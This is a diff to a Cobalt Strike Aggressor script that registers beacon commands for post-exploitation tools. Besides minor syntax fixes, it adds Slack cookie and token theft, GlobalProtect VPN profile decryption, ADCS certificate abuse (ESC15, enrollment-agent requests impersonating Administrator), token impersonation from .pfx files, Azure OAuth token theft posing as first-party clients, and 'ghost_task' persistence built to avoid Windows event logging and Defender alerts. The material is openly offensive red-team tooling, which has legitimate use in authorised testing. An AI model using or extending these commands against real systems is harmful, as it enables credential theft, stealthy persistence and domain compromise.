@@ -81,7 +81,7 @@ sub ops {
 		if ($count > 0) {
 			if ($arg ismatch '/.*:.*') {
 				$arg = replace($arg, '\A/',"");
-				($key $val) = split(":", $arg, 2);
+				($key, $val) = split(":", $arg, 2);
 				%arguments[$key] = $val;
 			}
 			else if ($arg ismatch '/.*') {
@@ -220,7 +220,7 @@ Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
          ERRORMODE    Required. The error mode of the service. The valid 
                       options are:
                         0 - ignore errors
-                        1 - nomral logging
+                        1 - normal logging
                         2 - log severe errors
                         3 - log critical errors
          STARTMODE    Required. The start mode for the service. The valid
@@ -230,6 +230,82 @@ Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
                         4 - disabled
          HOSTNAME     Optional. The host to connect to and run the commnad on. The
                       local system is targeted if a HOSTNAME is not specified.
+"
+);
+
+#sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
+sub bsc_failure
+{
+    local('$hostname $servicename $resetperiod $rebootmessage $command $numactions $actions $bid $args');
+    $bid = $1;
+    $servicename = $2;
+    $resetperiod = $3;
+    $rebootmessage = $4;
+    $command = $5;
+    $numactions = $6;
+    $actions = $7;
+    $hostname = $8;
+    $args = bof_pack($bid, "zzizzsz", $hostname, $servicename, $resetperiod, $rebootmessage, $command, $numactions, $actions);
+    beacon_inline_execute($bid, readbof($1, "sc_failure"), "go", $args);
+}
+
+#sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
+alias sc_failure
+{
+    local('$hostname $servicename $resetperiod $rebootmessage $command $numactions $actions $junk');
+
+    if (size(@_) == 7)
+    {
+        $servicename = $2;
+        $resetperiod = $3;
+        $rebootmessage = $4;
+        $command = $5;
+        $numactions = $6;
+        $actions = $7;
+        $hostname = $null;
+    }
+    else if(size(@_) == 8)
+    {
+        $servicename = $2;
+        $resetperiod = $3;
+        $rebootmessage = $4;
+        $command = $5;
+        $numactions = $6;
+        $actions = $7;
+        $hostname = $8;
+    }
+    else
+    {
+        berror($1, beacon_command_detail('sc_failure'));
+        return;
+    }
+    bsc_failure($1, $servicename, $resetperiod, $rebootmessage, $command, $numactions, $actions, $hostname);
+}
+
+beacon_command_register(
+    "sc_failure",
+    "Changes the actions upon failure",
+    "
+Command: sc_failure 
+Summary: This command configures the actions upon failure of an existing service on the target host.
+Usage:   sc_failure <SVCNAME> <RESETPERIOD> <REBOOTMESSAGE> <COMMAND> <NUMACTIONS> <ACTIONS> <OPT:HOSTNAME>
+         SVCNAME        Required. The name of the service to create.
+         RESETPERIOD    Required. Length of period of no failures (in seconds)
+                        after which to reset the failure count to 0 (may be INFINITE)
+                        (Must be used in conjunction with ACTIONS )
+         REBOOTMESSAGE  Message broadcast before rebooting on failure. (NULL = \"\")
+         COMMAND        Command line to be run on failure. (NULL = \"\")
+         NUMACTIONS     How many actions to be configured  -- e.g., 3/5000/2/800 is <2> actions
+         ACTIONS        Failure actions and their delay time (in milliseconds),
+                        separated by / (forward slash) -- e.g., 3/5000/2/800
+                        Valid actions are:
+                            0 - No action
+                            1 - Restart the service
+                            2 - Reboot the computer
+                            3 - Run a command
+                        (Must be used in conjunction with the RESETPERIOD option) (NULL = \"\")
+         HOSTNAME       Optional. The host to connect to and run the commnad on. The
+                        local system is targeted if a HOSTNAME is not specified.
 "
 );
 
@@ -510,7 +586,7 @@ Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
 
 on beacon_output
 {
-    local('$beacon $message $id $output $parsed_return_file @cmd $ret $lp_files $parser $returned_len $returned_len $fp')
+    local('$beacon $message $id $output $parsed_return_file @cmd $ret $lp_files $parser $returned_len $returned_len $fp');
    
     $beacon = $1;
     $message = $2;
@@ -817,7 +893,7 @@ alias reg_delete
     # test if val in pos 1 is in Hive, if not, then assume it is a hostname
     # values at end, if multisz pack them using a variable bof string
 
-    local('$hostname $hive $path $key $i $delkey')
+    local('$hostname $hive $path $key $i $delkey');
 
     if(size(@_) < 3)
     {
@@ -906,7 +982,7 @@ alias reg_save
 
 sub breg_save
 {
-    local('$hive $regpath $output $i')
+    local('$hive $regpath $output $i');
 
     $hive = %reghives[$2];
     $regpath = $3;
@@ -1052,7 +1128,7 @@ Note:    Please see https://docs.microsoft.com/en-us/windows/win32/taskschd/task
 #schtasksdelete <OPT:HOSTNAME> <TASKNAME> <TYPE>
 alias schtasksdelete
 {
-    local('$bid $args $server $taskname $isfolder')
+    local('$bid $args $server $taskname $isfolder');
     $bid = $1;
     $server = "";
     
@@ -1121,7 +1197,7 @@ Note:    If you are deleting a folder, it must be empty.
 #schtasksstop <OPT:HOSTNAME> <TASKNAME>
 alias schtasksstop
 {
-    local('$bid $args $server $taskname')
+    local('$bid $args $server $taskname');
     $bid = $1;
     $server = "";
     if ( size(@_) < 2)
@@ -1164,7 +1240,7 @@ Note:    The full path including the task name must be given, e.g.:
 #schtasksrun <OPT:HOSTNAME> <TASKNAME>
 alias schtasksrun
 {
-    local('$bid $args $server $taskname')
+    local('$bid $args $server $taskname');
     $bid = $1;
     $server = "";
     if ( size(@_) < 2)
@@ -1495,6 +1571,24 @@ Usage:   chromeKey
 "  
 );
 
+#slackKey
+alias slackKey{
+    beacon_inline_execute($1, readbof($1, "slackKey"), "go", $null);
+}
+
+beacon_command_register(
+    "slackKey",
+    "Decrypts the provided base64 encoded Chrome key",
+    "
+Command: slackKey
+Summary: This command decrypts the provided base64 encoded Slack key for use 
+         in decrypting cookies. If you get results, download the Cookies file 
+         from slack.  An example Filepath is:
+  C:\\Users\\user\\AppData\\Roaming\\Slack\\Network\\Cookies
+
+Usage:   slackKey
+"  
+);
 
 
 sub bshspawnas {
@@ -1564,10 +1658,15 @@ beacon_command_register(
 );
 
 alias adcs_request {
-	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');
+	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine $app_policy');
 
-	%params = ops(@_);
-	@keys = keys(%params);
+    if(size(@_) < 2)
+    {
+        berror($1, beacon_command_detail("adcs_request"));
+		berror($1, "Need to provide the Certificate Authority at a minimum");
+		return;
+    }
+
 	
 	$adcs_request_ca = "";
 	$adcs_request_template = "";
@@ -1575,32 +1674,19 @@ alias adcs_request {
 	$adcs_request_altname = "";
 	$adcs_request_install = 0;
 	$adcs_request_machine = 0;
+    $app_policy = 0;
+    $dns = 0;
 	
-	if ("CA" in @keys) {
-		$adcs_request_ca = %params["CA"];
-	}
-    else {
-		berror($1, beacon_command_detail("adcs_request"));
-		berror($1, "Need to provide the Certificate Authority at a minimum");
-		return;
-    }
-    if ("TEMPLATE" in @keys) {
-        $adcs_request_template = %params["TEMPLATE"];
-    }
-    if ("SUBJECT" in @keys) {
-        $adcs_request_subject = %params["SUBJECT"];
-    }
-    if ("ALTNAME" in @keys) {
-        $adcs_request_altname = %params["ALTNAME"];
-    }
-    if ("INSTALL" in @keys) {
-        $adcs_request_install = 1;
-    }
-    if ("MACHINE" in @keys) {
-        $adcs_request_machine = 1;
-    }
-    
-	$args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
+    $adcs_request_ca = $2;
+	$adcs_request_template = iff(-istrue $3, $3, "");
+    $adcs_request_subject = iff(-istrue $4, $4, "");
+    $adcs_request_altname = iff(-istrue $5, $5, "");
+    $adcs_request_install = iff(-istrue $6, $6, 0);
+    $adcs_request_machine = iff(-istrue $7, $7, 0);
+    $app_policy = iff(-istrue $8, $8, 0);
+    $dns = iff(-istrue $9, $9, 0);
+
+	$args = bof_pack($1, "ZZZZssss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine, $app_policy, $dns);
 	beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
 }
 
@@ -1612,15 +1698,74 @@ Command: adcs_request
 Summary: This command connects a certificate authority and requests an enrollment 
          certificate of the specified type for the specified subject and alternative 
          name. It will also optionally install the certificate for the current context.
-Usage:   adcs_request /CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]
+Usage:   adcs_request CA [opt:TEMPLATE] [opt:SUBJECT] [opt: ALTNAME] [opt: INSTALL] [opt:MACHINE]
          CA        Required. The certificate authority to use.
-         TEMPLATE  Optional. The certificate type to request.
-         SUBJECT   Optional. The subject's distinguished name.
-         ALTNAME   Optional. The alternate subject's distinguished name.
-         INSTALL   Optional. Install the certificate in current context?
-         MACHINE   Optional. Request a certificate for a machine instead of a user?
+         TEMPLATE  Optional. The certificate type to request. Use \"\" for default of User/Machine
+         SUBJECT   Optional. The subject's distinguished name. Use \"\" for default of current machine / user
+         ALTNAME   Optional. The alternate subject's distinguished name. Use \"\" for default
+         INSTALL   Optional. Install the certificate in current context? 0 = No, 1 = Yes. Default = 0
+         MACHINE   Optional. Request a certificate for a machine instead of a user? 0 = No, 1 = Yes. Default = 0
+         ADD_APP_POLICY Optional. Adds App policy to allow client auth and Acting as a certificate agent. (ESC15)
+         DNS       Optional. 1 = Subject Altname given as a DNS name, 0 = Subject alt name given as UPN. Default = 0
+
+         All arguments are positional. To a specify a non-default value for a optional you must specify a value for 
+         All arguments prior to that given optional.
+
+Examples:
+basic:
+    adcs_request cert.example.org\\example-CERT-CA 
+
+all options:
+    adcs_request cert.example.org\\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org 0 0
+
+use quotes for any arguments with spaces.
 "
 );
+
+alias adcs_request_on_behalf
+{
+    local('$handle $enrollpfx');
+    if(size(@_) < 5)
+    {
+        berror($1, beacon_command_detail("adcs_request_on_behalf"));
+		return;
+    }
+    $handle = openf($4);
+    $enrollpfx = readb($handle, -1);
+    closef($handle);
+    if(strlen($enrollpfx) == 0)
+    {
+        berror($1, "unable to open file at path $enrollpfx ");
+        return;
+    }
+    
+    
+    $args = bof_pack($1, "ZZzb", $2, $3, $5, $enrollpfx);
+    beacon_inline_execute($1, readbof($1, "adcs_request_on_behalf"), "go", $args);
+}
+
+
+beacon_command_register(
+    "adcs_request_on_behalf",
+    "Requests an enrollment certificate on behalf of another user",
+    "
+Command: adcs_request_on_behalf
+Summary: This command allows you to take a certificate that has XCN_OID_ENROLLMENT_AGENT as an MSApplicationPolicies extension
+and allows you to then request a certificate as if you were any other user in the domain.
+
+Usage:  adcs_request_on_behalf [TEMPLATE] [REQUESTER] [ENROLLMENT_AGENT.pfx] [Download_Name]
+        TEMPLATE  Required. The Template that you wish to request on behalf of a target user
+        REQUESTER Required. The domain / username who you want to make the request on behalf of
+        ENROLLMENT_AGENT.pfx Required. Local file path to where the .pfx is with OID_ENROLLMENT_AGENT extension
+        Download_Name Required.  Name you want this file to have when downloaded by the C2 framework.
+
+On success the newly requested PFX will be available in the cobalt strike downloads tab
+in other frameworks it is dependent on proper handling of cobalt strike style download messages.
+        
+Example:
+
+    adcs_request_on_behalf User Example\\Administrator /tmp/enroll.pfx Admin.pfx"
+)
 
 alias office_tokens 
 {
@@ -1721,4 +1866,317 @@ beacon_command_register(
 Usage: resume <pid>
 
 attempts to resume the process listed"
+);
+
+alias get_priv {
+    local('$args');
+    if(size(@_) < 2)
+    {
+        berror($1, beacon_command_detail("get_priv"));
+        return;
+    }
+    $args = bof_pack($1, "z", $2);
+    beacon_inline_execute($1, readbof($1, "get_priv"), "go", $args);
+}
+
+beacon_command_register(
+    "get_priv",
+    "Activate a token privledge",
+    "Command: get_priv
+
+Usage: get_priv <Privledge Name>
+
+Privledge names are listed here https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
+They are the equivilent of what you see in whoami /all or our whoami bof from the SA repo
+"
+);
+
+# ghost_task localhost add demo "cmd.exe" "/c notepad.exe" LAB\Administrator weekly 14:12 monday,thursday
+# ghost_task localhost add "Microsoft\Office\Office Automatic Updates 2.0" "cmd.exe" "/c notepad.exe" LAB\employee001 daily 20:37
+# ghost_task DC01.lab.corp add demo "cmd.exe" "/c notepad.exe" LAB\Administrator daily 15:19
+# thx L.N.
+alias ghost_task
+{
+    local('$arglen $hostname $operation $taskname $program $argument $username $scheduletype $time $day $args');
+    $bid = $1;
+    $arglen = size(@_);
+    if ($arglen == 1) {
+        berror($bid, "No computer name (e.g., localhost/remote server hostname) provided.\n");
+        return;
+    } else if ($arglen == 2) {
+        berror($bid, "No reg task operation (e.g., add/delete) provided.\n");
+        return;
+    }
+    $hostname = lc($2);
+    $operation = lc($3);
+
+    if($operation eq "add")
+    {
+       if ($arglen < 8) {
+            berror($bid, beacon_command_detail("ghost_task"));
+            return;
+       }
+       $taskname = lc($4);
+       $program = lc($5);
+       $argument = lc($6);
+       $username = lc($7);
+       $scheduletype = lc($8);
+       if($scheduletype eq "weekly") {
+            $time = lc($9);
+            $day = lc($10);
+            $args = bof_pack($bid, "izzzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time, $day);
+       }
+       else if ($scheduletype eq "second") {
+            $time = lc($9);
+            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
+       }
+       else if ($scheduletype eq "daily") {
+            $time = lc($9);
+            $args = bof_pack($bid, "izzzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype, $time);
+       }
+       else if ($scheduletype eq "logon") {
+            $args = bof_pack($bid, "izzzzzzz", $arglen, $hostname, $operation, $taskname, $program, $argument, $username, $scheduletype);
+       }
+       else {
+            berror($bid, "Unknown schedule type.\n");
+            return;
+       }
+    }
+    else if($operation eq "delete")
+    {
+        if ($arglen < 4) {
+            berror($bid, beacon_command_detail("ghost_task"));
+            return;
+        }
+        $taskname = lc($4);
+        $args = bof_pack($bid, "izzz", $arglen, $hostname, $operation, $taskname);
+    }
+    else
+    {
+        berror($bid, beacon_command_detail("ghost_task"));
+        return;
+    }
+    beacon_inline_execute($bid, readbof($bid, "ghost_task"), "go", $args);
+}
+
+beacon_command_register(
+    "ghost_task",
+    "Create or modify a local or remote scheduled task, without triggering Windows events 4698 and 106.",
+    "
+Command: ghost_task
+Summary: Create or modify a local or remote scheduled task, without triggering 
+         Windows events 4698 and 106.         
+Usage:   ghost_task <hostname/localhost> <operation> <taskname> <program> <argument> <username> <scheduletype> <time/second> <day>
+         - hostname/localhost: Remote computer name or localhost.
+         - operation: add/delete
+           - add: Create or modify a scheduled task using only registry keys. Requires restarting the Schedule service to load the task definition.
+           - delete: Delete a scheduled task. Requires restarting the Schedule service to offload the task.
+         - taskname: Name of the scheduled task.
+         - program: Program to be executed.
+         - argument: Arguments for the program.
+         - username: User account under which the scheduled task will run.
+         - scheduletype: Supported triggers: second, daily, weekly, and logon.
+         - time/second (applicable for 'second', 'daily', and 'weekly' triggers):
+           - For 'second' trigger: Specify the frequency in seconds for task execution.
+           - For 'daily' and 'weekly' triggers: Specify the exact time (e.g., 22:30) for task execution.
+         - day (applicable for 'weekly' trigger): Days to execute the scheduled task (e.g., monday, thursday).
+Note:    As of October 21, 2023, this tool has been tested on Windows 10, Windows Server 2016, 2019, and 2022
+         As of October 21, 2023, no alert and no scheduled task creation event (ScheduledTaskCreated action type) will be generated in MDE (Microsoft Defender For Endpoint)
+         To create a scheduled task using this tool, NT AUTHORITY/SYSTEM privileges are required
+         After configuring the scheduled task, you'll need to either restart the system or await the next reboot for the task to be loaded into the Schedule service process and subsequently executed
+"
+);
+alias slack_cookie 
+{
+	local('$pid $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: slack_cookie <pid>");
+		return;
+	}
+	$pid = parseNumber($2, 10);
+    berror($1, $pid);
+
+	$args = bof_pack($1, "i", $pid);
+	beacon_inline_execute($1, readbof($1, "slack_cookie"), "go", $args);
+}
+
+beacon_command_register(
+	"slack_cookie",
+	"Searches memory for Slack tokens",
+	"Command: slack_cookie
+
+Usage: slack_cookie <pid> "
+);
+
+beacon_command_register(
+	"shutdown",
+	"Shutdown or reboot a local or remote system in the number of seconds provided",
+	"
+    Command: shutdown
+    Summary: Shutdown or reboot the local/remote system with or without a message, with or withough allowing the closing of apps in
+             the time specified. WARNING: non-zero times will prompt the user.  Obviously, remote requires administrative privileges.
+    Usage:   shutdown <hostname> \"<message>\" <time> <closeapps> <reboot>
+		     - hostname: For localhost use \"\"
+		     - \"message\": For no message use \"\".  Make sure to enclose in quotes.
+		     - time: The number of seconds before the shutdown/reboot.
+                - 0 for immediately.
+                - WARNING: Anything non-zero will prompt user with <message>
+		     - closeapps: Whether or not to allow the user to save/close applications
+                - 0 to allow user to save before closing application
+                - 1 for close applications with unsaved changes
+		     - reboot:
+                - 1 to reboot the system after shutdown
+                - 0 to have it stay off (shutdown)
+
+
+		NOTE: The flags (SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_SECURITYFIX | SHTDN_REASON_FLAG_PLANNED) for security patch,
+              planned reboot are hard-coded but may be added later as changeable or may be changed in entry.c.
+"
+);
+
+alias shutdown {
+	local('$bid $hostname $message $time $ca $rb $barch $str');
+	($bid, $hostname, $message, $time, $ca, $rb) = @_;
+#	$bid = $1;
+#	$hostname = $2;
+#	$message = $3;
+#	$time = $4;
+#	$ca = $5;
+#	$rb = $6;
+
+	if($time eq $null || $ca eq $null || $rb eq $null) {
+		berror($bid, beacon_command_detail("shutdown"));
+		return;
+	}
+
+    if( ($ca != 0 && $ca != 1)  || ($rb != 0 && $rb != 1) ) {
+		berror($bid, beacon_command_detail("shutdown"));
+		return;
+    }
+
+    if(bdata($bid)['computer'] ismatch "(?i)$hostname" || bdata($bid)['computer'] ismatch "(?i)localhost") { $hostname = $null; }
+
+    $str = "Issuing " . iff(($rb == 0), "shutdown", "reboot") . " to " . iff(($hostname eq ""), "localhost", $hostname) . " in $time seconds" . iff(($message eq ""), ".", " with message '" . $message . "'.") .
+            " Applications " . iff(($ca eq 0), "closed after user save", "closed without chance to save" . ".\n");
+	btask($bid, $str, "T1529");
+
+	$args = bof_pack($bid, "zziss", $hostname, $message, $time, $ca, $rb);
+	beacon_inline_execute($bid,  readbof($bid, "shutdown"), "go", $args);
+
+}
+
+alias global_unprotect {
+    beacon_inline_execute($1, readbof($1, "global_unprotect"), "go", $null);
+}
+
+beacon_command_register(
+    "global_unprotect",
+    "Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings"
+    "Usage: global_unprotect
+    
+    There are no arguments to this command"
+)
+sub bschtaskscreate
+{
+    local('$server $taskpath $taskxml $dialog $fpath $fp $bid $fdata $mode $index $force $args');
+    $bid = $1;
+    $server = "";
+    $fp = $null;
+    $taskpath = $2;
+    $mode = 1;
+    $force = 1;
+    $fpath = $3;
+    if(!-canread $fpath)
+    {
+        berror($bid, "Unable to read the xml task definition file: $fpath");
+        return;
+    }
+    $fp = openf($fpath);
+    $fdata = readb($fp, -1);
+    closef($fp);
+
+    $args = bof_pack($bid, "ZZZii", $server, $taskpath, $fdata, $mode, $force);
+    beacon_inline_execute($bid, readbof($bid, "schtaskscreate"), "go", $args);
+}
+
+alias make_token_cert
+{
+    local('$handle $certpath $cert $password $args');
+    if(size(@_) < 2)
+    {
+        berror($1, "usage: make_token_cert <.pfx local path> [opt: .pfx password]");
+        return;
+    }
+    $certpath = $2;
+    $password = iff($3, $3, "");
+    if(!-canread $certpath)
+    {
+        berror($1, "Unable to read $certpath on local system");
+        return;
+    }
+    $handle = openf($certpath);
+    $cert = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($1, "bZ", $cert, $password);
+    beacon_inline_execute($1, readbof($1, "make_token_cert"), "go", $args);
+}
+
+beacon_command_register(
+    "make_token_cert",
+    "Applies an impersonation token based on the Alt Name in a supplied .pfx file",
+    "Command: make_token_cert
+
+Usage make_token_cert <path to .pfx> [opt: password]
+
+Takes the path to a .pfx and optionally the password to decrypt the .pfx.
+Reads it into the certificate store for the current user and creates an impersonation token with it.
+Then deletes it from the users certificate store.");
+
+alias get_azure_token
+{
+    #I'm going to do validation on the bof side since that works more cross implant
+    local('$clientid $scope $browserType $hint $browserPath $args')
+    if(size(@_) < 4)
+    {
+        berror($1, beacon_command_detail("get_azure_token"));
+        return;
+    }
+    $clientid = $2;
+    $scope = $3;
+    $browserType = $4;
+    $hint = iff(-istrue $5, $5, "");
+    $browserPath = iff(-istrue $6, $6, "");
+    $args = bof_pack($1, "zzizz", $clientid, $scope, $browserType, $hint, $browserPath);
+    beacon_inline_execute($1, readbof($1, "get_azure_token"), "go", $args);
+}
+
+beacon_command_register(
+    "get_azure_token",
+    "perform an OAuth code grant against azure and print the returned tokens",
+"Usage: get_azure_token <client-id> <scope> <browser (see below)> [opt: hint] [opt: browser_path]
+
+The client_id specified must already have consent in the tennant and accept http://localhost as the redirect URL
+see https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json for many examples.
+
+scope must match what is expected for the given client_id.  These can similarly be found in the roadtools link above.
+
+hint if provided should match the email of the user who you want to authenticate as.  There must exist an existing saved login for said user.
+When not provided this command will fail if more then one saved login exists.
+
+browser_path is the full path the the browser executable.  Use it if non-standard path or browser is used.
+
+browser should an integer with one of the following values:
+    0 (edge)
+    1 (chrome)
+    2 (default)
+    3 (other)
+default in this context means whatever the user has set as the default link handler for https.
+
+Example:
+   Log into azure pretending to be the first party Azure powershell module (Connect-AZAccount)
+    get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 \"74658136-14ec-4630-ad9b-26e160ff0fc6/user_impersonation offline_access openid profile\" 2 \"your azure email here\"
+
+"
 );
